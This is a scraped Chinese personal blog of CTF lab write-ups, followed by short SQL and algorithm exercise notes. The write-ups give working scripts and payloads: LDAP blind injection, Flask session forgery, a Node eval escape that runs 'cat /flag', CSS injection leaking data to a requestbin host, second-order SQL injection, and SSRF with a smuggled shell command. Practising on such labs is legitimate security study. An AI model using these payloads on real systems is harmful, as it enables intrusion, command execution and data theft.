charset=utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; /*禁止选中文字*/ body{ -moz-user-select: none; /*火狐*/ -webkit-user-select: none; /*webkit浏览器*/ -ms-user-select: none; /*IE10*/ -khtml-user-select: none; /*早期浏览器*/ user-select: none; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;script type=\u0026#39;text/javascript\u0026#39;\u0026gt; //禁用右键（防止右键查看源代码） window.oncontextmenu=function(){return false;} //禁止任何键盘敲击事件（防止F12和shift+ctrl+i调起开发者工具） window.onkeydown = window.onkeyup = window.onkeypress = function () { window.event.returnValue = false; return false; } //如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 var h = window.innerHeight,w=window.innerWidth; window.onresize = function () { if (h!= window.innerHeight||w!=window.innerWidth){ window.close(); window.location = \u0026#34;about:blank\u0026#34;; } } /*好吧，你的开发者工具是单独的窗口显示，不会改变原来网页的高度和宽度， 但是你只要修改页面元素我就重新加载一次数据,让你无法修改页面元素（不支持IE9以下浏览器）*/ if(window.addEventListener){ window.addEventListener(\u0026#34;DOMCharacterDataModified\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMAttributeNameChanged\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMCharacterDataModified\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMElementNameChanged\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMNodeInserted\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMNodeInsertedIntoDocument\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMNodeRemoved\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMNodeRemovedFromDocument\u0026#34;, function(){window.location.reload();}, true); window.addEventListener(\u0026#34;DOMSubtreeModified\u0026#34;, function(){window.location.reload();}, true); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; JavaScript 实现禁止打开控制台（右键/工具栏/F12/Shift+Ctrl+I）\n判断浏览器的可视高度和可视宽度是否有改变，清奇的思路。\n把开发者工具是单独的窗口显示就好。\n还有，就是先造个本地网站的404页面，在那里把开发者工具打开，然后再回来。\n还有可以试试：\nctrl+shift+i\nctrl+shift+j\nctrl+u\n","date":"2021-12-05T00:00:19+08:00","permalink":"https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/","title":"绕过禁用F12"},{"content":"WEB [签到] flag 凑齐20位，召唤flag\nZmxhZ3tuc3NfbG9naW59\nbase64解码\nflag{nss_login}\n[萌]odd_upload Smarty\nssti模板注入，文件覆盖\n自己找个Smarty版本，对比目录着传\n访问index.php\neasyinject 通过报错发现是ldap\n现学一波，没学明白\nLDAP查询语法\nsearch语法：attribute operator value search filter options:( \u0026#34;\u0026amp;\u0026#34; or \u0026#34;|\u0026#34; (filter1) (filter2) (filter3) ...) (\u0026#34;!\u0026#34; (filter)) 但是题目原因，可以通过布尔盲注来确定用户名\nimport requests url = \u0026#39;http://47.106.172.144:2333\u0026#39; flag, done = \u0026#39;LDAP\u0026#39;, False while not done: for j in range(33, 127): payload = flag + chr(j) + \u0026#39;*\u0026#39; data = {\u0026#39;user\u0026#39;: payload, \u0026#39;pass\u0026#39;: \u0026#39;123\u0026#39;} r = requests.get(url, params=data) if \u0026#39;密码错误\u0026#39; in r.text or \u0026#39;查询用户不唯一\u0026#39; in r.text: flag += chr(j) print(flag) break else: done = True print(\u0026#39;flag{\u0026#39; + flag.lower() + \u0026#39;}\u0026#39;) 还就跑出来了\nMISC [签到]签到 flag{Dnui_ctf_2021_s1gn_in}\n[萌新]在哪呢 ctrl+f\n只是个PNG，别想太多了.png binwalk一分，010一看\nCRYPTO [签到]键盘侠 UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN\nflag{} 提交时括号内为大写字母\n键盘画图\nCLCKOUTHK\n[萌新]素数 10个不重复的长度\u0026gt;=1024bits的素数\nimport gmpy2 from gmpy2 import mpz rs = gmpy2.random_state() def gen_prime(): p = gmpy2.mpz_urandomb(rs, 1024) while not gmpy2.is_prime(p): p = gmpy2.add(p, 1) return p for i in range(100): p = gen_prime() print(p) 多弄几遍，有时候生成的数不是309位整数\n","date":"2021-12-04T19:00:12+08:00","permalink":"https://proben1.github.io/2021/2021dnuictfwp/","title":"2021DNUICTF,wp"},{"content":"[FBCTF2019]Event flask\n没想到在event_important有注入\n猜它可能大概想这样\nname = event_name address = event_address print(event_important) event_name=1\u0026amp;event_address=1\u0026amp;event_important=__class__.__init__.__globals__[app].config 于是查到秘钥\nfb+wwn!n1yo+9c(9s6!_3o#nqm\u0026amp;\u0026amp;_ej$tez)$_ik36n8d7o6mr#y\n解密，出现的是字符串，不是json\n加密\nfrom flask import Flask from flask.sessions import SecureCookieSessionInterface app = Flask(__name__) app.secret_key = b\u0026#39;fb+wwn!n1yo+9c(9s6!_3o#nqm\u0026amp;\u0026amp;_ej$tez)$_ik36n8d7o6mr#y\u0026#39; session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) @app.route(\u0026#39;/\u0026#39;) def index(): print(session_serializer.dumps(\u0026#34;admin\u0026#34;)) index() ImFkbWluIg.YZ92Gw.m7Ax9nFV8ULTllJK2X31bEjyCuU\n","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/fbctf2019event/","title":"[FBCTF2019]Event"},{"content":"[FireshellCTF2020]URL TO PDF 由于刚刚有些无聊所以再开一道\n开局一个输入框，url转pdf？没见过\n弹出下载，但是没法打开，用010来看，可以看到html，猜测爬虫之类的，可以开个服务器看看请求\nroot@VM-8-15-debian:~# nc -lvp 10004 listening on [any] 10004 ... 117.21.200.166: inverse host lookup failed: Unknown host connect to [10.0.8.15] from (UNKNOWN) [117.21.200.166] 1519 GET / HTTP/1.1 Host: 82.157.174.226:10004 User-Agent: WeasyPrint 51 (http://weasyprint.org/) Accept: */* Accept-Encoding: gzip, deflate Connection: close WeasyPrint是啥？没见过\nWeasyPrint 是一个 Python 的虚拟 HTML 和 CSS 渲染引擎，可以用来将网页转成 PDF 文档。旨在支持 Web 标准的打印。\nWeasyPrint 会把所有它支持的东西 都请求一遍然后放在 PDF 里，这里出现了漏洞，在 \u0026lt;link\u0026gt; 标签内 href 加载 file:// 实现 SSRF + 任意文件读取\nWeasyprint (the library used here) allows including files into the PDF using \u0026lt;link rel=attachment href=\u0026quot;PATH\u0026quot; /\u0026gt; in the HTML source for the PDF\nIt’s a documented feature\nThe information about weasyprint was leaked using a background-image CSS property to load an attacker-controlled image\nThe vendor and version (weasyprint 44) were in the HTTP headers\n开了个docker，写个html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Captain\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;a rel=\u0026#39;attachment\u0026#39; href=\u0026#39;file:///flag\u0026#39;\u0026gt; \u0026lt;/body\u0026gt; ","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/fireshellctf2020url_to_pdf/","title":"[FireshellCTF2020]URL_TO_PDF"},{"content":"js题，长知识了\nF12，ctrl+U查源码\n源码\nconst express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const cookieSession = require(\u0026#39;cookie-session\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const keys = require(\u0026#39;./key.js\u0026#39;).keys; function md5(s) { return crypto.createHash(\u0026#39;md5\u0026#39;) .update(s) .digest(\u0026#39;hex\u0026#39;); } function saferEval(str) { if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/\u0026amp;|^%\u0026lt;\u0026gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, \u0026#39;\u0026#39;)) { return null; } return eval(str); } // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个 const template = fs.readFileSync(\u0026#39;./index.html\u0026#39;).toString(); function render(results) { return template.replace(\u0026#39;{{results}}\u0026#39;, results.join(\u0026#39;\u0026lt;br/\u0026gt;\u0026#39;)); } const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(bodyParser.json()); app.use(cookieSession({ name: \u0026#39;PHPSESSION\u0026#39;, // 2020.3/WORKER2 嘿嘿，给👴爪⑧ keys })); Object.freeze(Object); Object.freeze(Math); app.post(\u0026#39;/\u0026#39;, function (req, res) { let result = \u0026#39;\u0026#39;; const results = req.session.results || []; const { e, first, second } = req.body; if (first \u0026amp;\u0026amp; second \u0026amp;\u0026amp; first.length === second.length \u0026amp;\u0026amp; first!==second \u0026amp;\u0026amp; md5(first+keys[0]) === md5(second+keys[0])) { if (req.body.e) { try { result = saferEval(req.body.e) || \u0026#39;Wrong Wrong Wrong!!!\u0026#39;; } catch (e) { console.log(e); result = \u0026#39;Wrong Wrong Wrong!!!\u0026#39;; } results.unshift(`${req.body.e}=${result}`); } } else { results.unshift(\u0026#39;Not verified!\u0026#39;); } if (results.length \u0026gt; 13) { results.pop(); } req.session.results = results; res.send(render(req.session.results)); }); // 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI app.get(\u0026#39;/source\u0026#39;, function (req, res) { res.set(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/javascript;charset=utf-8\u0026#39;); res.send(fs.readFileSync(\u0026#39;./index.js\u0026#39;)); }); app.get(\u0026#39;/\u0026#39;, function (req, res) { res.set(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/html;charset=utf-8\u0026#39;); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || [])) }); app.listen(80, \u0026#39;0.0.0.0\u0026#39;, () =\u0026gt; { console.log(\u0026#39;Start listening\u0026#39;) }); 看了一遍，盯紧两个地方，一个是超大正则，一个是判断md5\n第一个，正则可视化\nhttps://regexper.com/\nhttps://wangwl.net/r/vr\n允许()+\\-*/\u0026amp;|^%\u0026lt;\u0026gt;=,?:，允许Math.xxxx这样子的任意形式函数调用，以及浮点数科学计数法的数字表示形式，还有空格\n知识：\n(?:)就是为了分组，但是不捕获下来供正则表达式其他部分使用，叫非获取匹配\nemmm，就是简简单单分个组：pattern4和pattern5作用一样\nvar pattern1=/aacdaa/; var pattern2=/(?:aa|bb)cd\\1/; var pattern3=/(aa|bb)cd\\1/; var pattern4=/aacd|bbcd/; var pattern5=/(?:aa|bb)cd/; var str=\u0026#34;aacdaa\u0026#34;; console.log(str.match(pattern1)); // [\u0026#34;aacdaa\u0026#34;, index: 0, input: \u0026#34;aacdaa\u0026#34;] console.log(str.match(pattern2)); // null console.log(str.match(pattern3)); // [\u0026#34;aacdaa\u0026#34;, \u0026#34;aa\u0026#34;, index: 0, input: \u0026#34;aacdaa\u0026#34;] /g 全局匹配，咱不管\n第二个\nfirst \u0026amp;\u0026amp; second \u0026amp;\u0026amp; first.length === second.length \u0026amp;\u0026amp; first!==second \u0026amp;\u0026amp; md5(first+keys[0]) === md5(second+keys[0])\n长度相同，互不相等，加key[0]之后md5相等\n弱类型，加盐之后都是字符串\n让first 是字符1，second 是数组1，但urlencode没法接收数组\n正好这里可以传json，也就可以用json解决\n记得加上Content-Type\u0026quot;: \u0026ldquo;application/json\n绕过正则看不下去了，直接贴结果\n(Math=\u0026gt; (Math=Math.constructor, Math.x=Math.constructor( Math.fromCharCode(114,101,116,117,114,110,32,112,114,111, 99,101,115,115,46,109,97,105,110,77,111,100,117,108,101, 46,114,101,113,117,105,114,101,40,39,99,104,105,108,100, 95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83, 121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))() ) )(Math+1) import requests import json headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; } url = \u0026#34;http://d609db3d-6a1a-4835-9b9e-623822d89eb1.node4.buuoj.cn:81/\u0026#34; data = {\u0026#34;e\u0026#34;: \u0026#34;(Math=\u0026gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)\u0026#34;, \u0026#34;first\u0026#34;: [0], \u0026#34;second\u0026#34;: \u0026#34;0\u0026#34;} r = requests.post(url, data=json.dumps(data), headers=headers) print(r.text) 学js去了\n","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/npuctf2020%E9%AA%8C%E8%AF%81/","title":"[NPUCTF2020]验证🐎"},{"content":"[安洵杯 2019]cssgame 露骨的F12\nhttps://websec.readthedocs.io/zh/latest/vuln/xss/trick/cssi.html\nCSS注入，如果有机会写任意CSS，那么可以做到\n1.得到input栏里的token\n2.得到\u0026lt;script\u0026gt;里的token\n当然，题里用flag代替token\n我们这里使用CSS selectors完成攻击\n/*选择value值为abc的input标签*/ input[value=\u0026#34;abc\u0026#34;] { } /*选择value值以a开头的input标签 */ input[value^=\u0026#34;a\u0026#34;] { } 注入代码：\ninput[name=flag][value^=\u0026#34;b\u0026#34;] ~ * {background-image: url(\u0026#34;http://x.x.x.x/b\u0026#34;);} 更换选择的值，选择到了就加载对应的background-image\n~ *简单理解为防止出现background-image不加载的情况\n# encoding = utf-8 import string from selenium import webdriver\timport time url = \u0026#39;http://df3ac406-f5d0-4459-af64-3ff82a3d9f39.node4.buuoj.cn:81/\u0026#39; driver = driver=webdriver.Chrome(\u0026#34;F:\\\\chromedriver_win32\\\\chromedriver.exe\u0026#34; ) flag = \u0026#39;\u0026#39; s = string.digits+string.ascii_letters+\u0026#39;{\u0026#39;+\u0026#39;}\u0026#39;+\u0026#39;_\u0026#39; #可见字符 for i in s: flag += i string = \u0026#39;input[name=flag][value^=\u0026#34;%s\u0026#34;] ~ * {background-image: url(\u0026#34;http://http.requestbin.buuoj.cn/1q89at51/%s\u0026#34;);}\u0026#39;%(flag, flag) data = {\u0026#34;css\u0026#34;: string} driver.get(url) css = driver.find_element_by_name(\u0026#39;css\u0026#39;) css.send_keys(string) driver.find_element_by_xpath(\u0026#34;//input[@type=\u0026#39;submit\u0026#39;]\u0026#34;).click() flag= \u0026#39;\u0026#39; 麻了，这个脚本跑多了靶机就没反应了，然后就要重启靶机……神奇\n","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/%E5%AE%89%E6%B4%B5%E6%9D%AF2019cssgame/","title":"[安洵杯2019]cssgame"},{"content":"[网鼎杯2018]Unfinish 二次注入，注入点是在register.php传入的username中。\n1.猜测语句\ninsert table values (\u0026#39;email\u0026#39;,\u0026#39;username\u0026#39;,\u0026#39;password\u0026#39;) 2.表名是猜的\n过滤了information\nmysql版本是5.5.64，sys 库在MySQL5.6或更高版本才有。\n3.每次都需要注意换邮箱\n4.过滤了逗号，不能闭合。\n要用from for\n5.+如果被识别成空格，可以用%2B。 用异或也可以实现\nimport requests from bs4 import BeautifulSoup import re url = \u0026#39;http://3facbb99-4fb4-44fa-8fae-fa28575f788a.node4.buuoj.cn:81/\u0026#39; a = \u0026#39;\u0026#39; for i in range(0,60): email = \u0026#39;eqwews1@131416024w\u0026#39;+str(i) #insert table values (\u0026#39;email\u0026#39;,\u0026#39;username\u0026#39;,\u0026#39;password\u0026#39;) payload = \u0026#34;0\u0026#39; + ascii(substr((select * from flag) from \u0026#34;+str(i)+\u0026#34; for 1))+\u0026#39;0\u0026#34; register = {\u0026#39;email\u0026#39;:email,\u0026#39;username\u0026#39;:payload,\u0026#39;password\u0026#39;:\u0026#39;0\u0026#39;} login = {\u0026#39;email\u0026#39;:email,\u0026#39;password\u0026#39;:\u0026#39;0\u0026#39;} r1 = requests.post(url+\u0026#39;register.php\u0026#39;,data = register) r2 = requests.post(url+\u0026#39;login.php\u0026#39;, data = login,allow_redirects=True) soup = BeautifulSoup(r2.text,\u0026#39;html.parser\u0026#39;) a+=chr(int(soup.span.string.strip())) print(a) #print(soup.find_all(\u0026#39;span\u0026#39;)) #print(re.findall(\u0026#34;.*?\u0026lt;/span\u0026gt;\u0026#34;,r2.text)[0].replace(\u0026#39;\u0026lt;/span\u0026gt;\u0026#39;,\u0026#39;\u0026#39;).strip(),end=\u0026#39;\u0026#39;) 不用bs4用re硬找 ","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2018unfinish/","title":"[网鼎杯2018]Unfinish"},{"content":"快速拔刀（不是）\n快速找到关键源码\nvar express = require(\u0026#39;express\u0026#39;); var config = require(\u0026#39;../config\u0026#39;); var url=require(\u0026#39;url\u0026#39;); var child_process=require(\u0026#39;child_process\u0026#39;); var fs=require(\u0026#39;fs\u0026#39;); var request=require(\u0026#39;request\u0026#39;); var router = express.Router(); var blacklist=[\u0026#39;127.0.0.1.xip.io\u0026#39;,\u0026#39;::ffff:127.0.0.1\u0026#39;,\u0026#39;127.0.0.1\u0026#39;,\u0026#39;0\u0026#39;,\u0026#39;localhost\u0026#39;,\u0026#39;0.0.0.0\u0026#39;,\u0026#39;[::1]\u0026#39;,\u0026#39;::1\u0026#39;]; router.get(\u0026#39;/\u0026#39;, function(req, res, next) { res.json({}); }); router.get(\u0026#39;/debug\u0026#39;, function(req, res, next) { console.log(req.ip); if(blacklist.indexOf(req.ip)!=-1){ console.log(\u0026#39;res\u0026#39;); var u=req.query.url.replace(/[\\\u0026#34;\\\u0026#39;]/ig,\u0026#39;\u0026#39;); console.log(url.parse(u).href); let log=`echo \u0026#39;${url.parse(u).href}\u0026#39;\u0026gt;\u0026gt;/tmp/log`; console.log(log); child_process.exec(log); res.json({data:fs.readFileSync(\u0026#39;/tmp/log\u0026#39;).toString()}); }else{ res.json({}); } }); router.post(\u0026#39;/debug\u0026#39;, function(req, res, next) { console.log(req.body); if(req.body.url !== undefined) { var u = req.body.url; var urlObject=url.parse(u); if(blacklist.indexOf(urlObject.hostname) == -1){ var dest=urlObject.href; request(dest,(err,result,body)=\u0026gt;{ res.json(body); }) } else{ res.json([]); } } }); module.exports = router; indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。\n如果没有找到匹配的字符串则返回 -1。\nchild_process 新建子进程，从而执行 Unix 系统命令\nblacklist里屏蔽了一些ssrf绕过的方法，但是可以参考这篇文章绕过\nhttps://www.secpulse.com/archives/65832.html\n在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束\n二次解码：https://github.com/nodejs/node/blob/master/lib/url.js\nWUIAryqhfgd\r也就是URL中表示用户名和密码的字段会被二次解码，可以通过%2527@来闭合引号\n代码大意：\nget：判断访问ip是否在blacklist中，如果是本地访问就读取get参数中的url参数，去除其中的单引号和双引号，然后用nodejs的url.parse去解析。把解析后的url拼接到一条shell命令中执行。之后返回/tmp/log文件中的内容。\nPOST： 检测是否提交了url参数，若提交了该参数则会用url.parse解析，然后判断其中的主机名字段是否在blacklist中，不在的话，去使用GET方法请求url参数中所提交的url，返回请求的内容。\npayload：\n{\u0026#34;url\u0026#34;:\u0026#34;http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00\u0026#34;} 这个样子：\necho \u0026lsquo;http://a\u0026rsquo;a;cp$IFS/flag$IFS/tmp/log%00\u0026rsquo;\u0026raquo;/tmp/log\n","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/","title":"[网鼎杯2020半决赛]BabyJS"},{"content":"[网鼎杯 2020 玄武组]SSRFMe \u0026lt;?php function check_inner_ip($url) { $match_result=preg_match(\u0026#39;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/\u0026#39;,$url); if (!$match_result) { die(\u0026#39;url fomat error\u0026#39;); } try { $url_parse=parse_url($url); } catch(Exception $e) { die(\u0026#39;url fomat error\u0026#39;); return false; } $hostname=$url_parse[\u0026#39;host\u0026#39;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(\u0026#39;127.0.0.0\u0026#39;)\u0026gt;\u0026gt;24 == $int_ip\u0026gt;\u0026gt;24 || ip2long(\u0026#39;10.0.0.0\u0026#39;)\u0026gt;\u0026gt;24 == $int_ip\u0026gt;\u0026gt;24 || ip2long(\u0026#39;172.16.0.0\u0026#39;)\u0026gt;\u0026gt;20 == $int_ip\u0026gt;\u0026gt;20 || ip2long(\u0026#39;192.168.0.0\u0026#39;)\u0026gt;\u0026gt;16 == $int_ip\u0026gt;\u0026gt;16; } function safe_request_url($url) { if (check_inner_ip($url)) { echo $url.\u0026#39; is inner ip\u0026#39;; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info[\u0026#39;redirect_url\u0026#39;]) { safe_request_url($result_info[\u0026#39;redirect_url\u0026#39;]); } curl_close($ch); var_dump($output); } } if(isset($_GET[\u0026#39;url\u0026#39;])){ $url = $_GET[\u0026#39;url\u0026#39;]; if(!empty($url)){ safe_request_url($url); } } else{ highlight_file(__FILE__); } // Please visit hint.php locally. ?\u0026gt; 大致就先让你访问/hint.php，但有个ip检测，不能是内网ip\n使用\ngethostbyname 获取ip地址\n防御了xip.io这类利用dns解析的绕过方法 使用\nip2long 将ip地址转为整数，判断是否为内网网段\n防御了127.0.0.1/8 但这里头肯定有问题，不然也不可能出这题，先搜搜$url_parse相关\n最终找到一篇翻译文章\nhttps://www.anquanke.com/post/id/86527\n（静待20min）\n现在我们默认已经读过这篇文章了\n来，让我们试试文章里的curl与其他语言url解析器联合使用所出现的问题\n?url=http://@127.0.0.1:80 @baidu.com/hint.php 很有自信，但是返回了个bool(false)………………\n为什么……直接搜wp，也是这个……留下了疑惑\n肯定在这一块，好好的抛啥异常……\ntry { $url_parse=parse_url($url); } catch(Exception $e) { die(\u0026#39;url fomat error\u0026#39;); return false; } 好在wp里提供了另一种思路，DNS重绑定漏洞\nhttps://blog.csdn.net/NOSEC2019/article/details/103126829\n（静待15min）\n(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP (2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证 (3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。 (4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。 现在我们又读了一篇文章，很棒，工具网站\n快试试！（？）\n还有个方便的方法，题里忘了过滤了的\n0.0.0.0代表本机ipv4的所有地址，所以直接http://0.0.0.0/hint.php也可以……\n不错，所以为啥一开始翻ssrf过滤绕过的时候没找到这个方法^_^\n好在我们现在可以看到hint.php了\n\u0026lt;?php if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]===\u0026#34;127.0.0.1\u0026#34;){ highlight_file(__FILE__); } if(isset($_POST[\u0026#39;file\u0026#39;])){ file_put_contents($_POST[\u0026#39;file\u0026#39;],\u0026#34;\u0026lt;?php echo \u0026#39;redispass is root\u0026#39;;exit();\u0026#34;.$_POST[\u0026#39;file\u0026#39;]); } \u0026#34; 本来以为是过死亡exit\nhttps://xz.aliyun.com/t/8163\n结果不是……\n完全不会，今晚的目标就是成功复现！呜呜呜\nredis？怎么说……我就知道它是种NoSQL型数据库，来了解一下。\nhttps://www.cnblogs.com/powertoolsteam/p/redis.html\n首先……我要知道redis在啥端口——6379\n然后题里告诉你密码是root\n使用dict协议去访问redis\n?url=dict://0.0.0.0:6379 存在密码校验，再加上密码\n?url=dict://0.0.0.0:6379/auth root Redis客户端支持管道操作，可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复。所有的回复都可以在最后阅读。\ndict协议一次只能执行一条命令，因该是仅仅能进行密码验证。此处需要gopher协议，可以一次性完成密码验证以及恶意命令执行。\n攻击方式位Redis基于主从复制RCE\n提前了解主从复制是啥\n主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。\n接下来，利用这一点，我们创建\nhttps://github.com/xmsec/redis-ssrf https://github.com/n0b0dyCN/redis-rogue-server\n代码审计-\u0026gt;看到curl_exec想到ssrf-\u0026gt;打内网-\u0026gt;根据提示redisgetshell-\u0026gt;生成rogueserver（vps或buu中的linux靶机）-\u0026gt;利用gopher协议生成payload或者直接反弹shell\n参考\nhttps://www.secpulse.com/archives/132215.html\nhttps://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/\n学到了，这篇博客里绕过一开始限制的地方写的很全，建议去看看。\n","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme/","title":"[网鼎杯2020玄武组]SSRFMe"},{"content":"P5461 赦免战俘 心态小裂，写了n遍，最后发现循环里忘加x，y了\na = int(input()) b = [[1 for i in range(2**a)] for j in range(2**a)] l = 2**a def func(l,x,y): if l == 1 : return for i in range(x,x+int(l/2)) : for j in range(y,y+int(l/2)) : b[i][j] = 0 func(int(l/2),x+int(l/2),y) func(int(l/2),x,y+int(l/2)) func(int(l/2),x+int(l/2),y+int(l/2)) func(l,0,0) for i in range(2**a): for j in range(2**a): print(b[i][j],end=\u0026#34; \u0026#34;) print() ","date":"2021-11-22T16:37:25+08:00","permalink":"https://proben1.github.io/2021/p5461%E8%B5%A6%E5%85%8D%E6%88%98%E4%BF%98/","title":"P5461赦免战俘"},{"content":"182. 查找重复的电子邮箱 select `Email` from ( select `Email`, count(`Email`) as a from `Person` group by `Email` ) as temp where a \u0026gt; 1; 一些不熟悉的语句\nlike 模糊查询\nselect * from employees where last_name like \u0026#39;%a%\u0026#39;; group by（常常和聚合函数一起使用） 聚合函数：count() , sum() , avg() , max() , min() 根据by对数据按照哪个字段进行分组，或者是哪几个字段进行分组。\nselect 字段 from 表名 where 条件 group by 字段; # 单字段 select grade from student group by grade; # 多字段 select name , sum(salary) from student group by name , grade; name和grade看成一个整体，name和grade相同的才可以分成一组，一个不一样就不能分成一组。 having 对group by分组和聚合之后的数据进行过滤 （与where正好相反）\nselect 字段 from 表名 group by 字段 having 过滤条件; -- 查找人数大于 5 的部门 select dept_id, count(*) from employee group by dept_id having count(*) \u0026gt; 5; dept_id|count(*)| -------|--------| 4| 9| 5| 8| union 联合查询\nselect * from employees where eamil like \u0026#39;%a%\u0026#39; or department_id\u0026gt;90; 相当于 select * from employees where eamil like \u0026#39;%a%\u0026#39; union select * from employees where department_id\u0026gt;90; CONCAT() 函数\nCONCAT(str1,str2,…)\n将多个字符串连接成一个字符串。\nGROUP_CONCAT（）函数\n返回一个字符串结果，该结果由分组中的值连接组合而成。\n175. 组合两个表 select FirstName, LastName, City, State from Person left join Address on Person.PersonId = Address.PersonId; left join\n也叫left outer join，外连接\n1、 on 条件是在生成临时表时使用的条件，它不管 on 中的条件是否为真，都会返回左边表中的记录。 2、where 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 left join 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。 P1255 数楼梯 a = int(input()) def gogogo(index): if index \u0026gt; 2: print(index) return gogogo(index-1) + gogogo(index-2) elif index == 2: return 2 elif index == 1 or index == 0: return 1 print(gogogo(a)) 思路是对的，但是层数一多就g了\n于是想用循环取代递归\nn = int(input()) l = [0 for i in range(0,n+2)] l[0], l[1] = 1,1 if n == 0: print(0) else: for i in range(2,n+1): l[i] = l[i-1] + l[i-2] print(l[n]) 这样是可以通过的\n但是上网又搜了一个更恐怖的\na, b = 0, 1 for i in range(int(input())): a, b = b, a + b print(b if a else 0) P1143 进制转换 def trans_map(cint): if cint \u0026lt; 0: print(\u0026#34;不合法\u0026#34;) return elif cint \u0026lt; 10: return cint elif cint \u0026gt;= 10: return chr(cint - 10 + 65) def anyToTen(m, origin): # 任意进制的数转换为10机制 # 先将m转换为10进制 # 公式 num = an * m**(n-1) + an-1 * m**(n-2).....+ a0 * m**0 # 直接利用int的自带功能 return int(str(origin), base=m) def tenToAny(n, origin): # 10进制转换为任意进制的数 list = [] while True: # 取商 s = origin // n # 取余数 tmp = origin % n list.append(trans_map(tmp)) if s == 0: break origin = s list.reverse() list = [str(each) for each in list] print(\u0026#39;\u0026#39;.join(list)) # 将一个m进制的数转换为一个n进制的数 def transfer(m, n, origin): num = anyToTen(m, origin) target = tenToAny(n, num) if __name__ == \u0026#39;__main__\u0026#39;: a = int(input()) b = input() c = int(input()) transfer(a,c,b) 